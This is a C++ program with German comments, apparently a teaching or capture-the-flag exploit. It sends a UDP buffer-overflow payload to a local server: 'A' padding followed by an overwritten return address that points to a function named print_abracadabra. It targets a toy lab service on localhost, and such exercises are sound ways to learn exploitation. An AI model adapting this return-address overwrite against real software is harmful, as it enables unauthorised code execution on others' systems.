#include <arpa/inet.h>
#include <cstdint>
#include <cstring>
#include <iostream>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#define SERVER_IP "127.0.0.1"
#define SERVER_PORT 1234

int main(int argc, char *argv[]) {
  int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if (sockfd < 0) {
    perror("Socket erstellen fehlgeschlagen");
    return 1;
  }

  sockaddr_in server_addr = {};
  server_addr.sin_family = AF_INET;
  server_addr.sin_port = htons(SERVER_PORT);
  inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

  auto PAYLOAD_OFFSET_SIZE = std::strtoul(argv[1], nullptr, 10);

  char payload[PAYLOAD_OFFSET_SIZE + 8];

  std::memset(payload, 'A', PAYLOAD_OFFSET_SIZE);

  uintptr_t func_addr = 0x00000000004012d6; // Adresse von print_abracadabra
  *(uintptr_t *)(payload + PAYLOAD_OFFSET_SIZE) = func_addr;

  // Debug-Ausgabe der gesendeten Adresse
  std::cout << "[DEBUG] Vollständiger Payload vor dem Senden:" << std::endl;
  for (size_t i = 0; i < PAYLOAD_OFFSET_SIZE + 8; i++) {
    std::printf("%02x ", (unsigned char)payload[i]);
  }
  std::cout << std::endl;

  sendto(sockfd, payload, PAYLOAD_OFFSET_SIZE + 8, 0,
         (struct sockaddr *)&server_addr, sizeof(server_addr));

  std::cout << "[INFO] Payload gesendet!" << std::endl;
  close(sockfd);
  return 0;
}
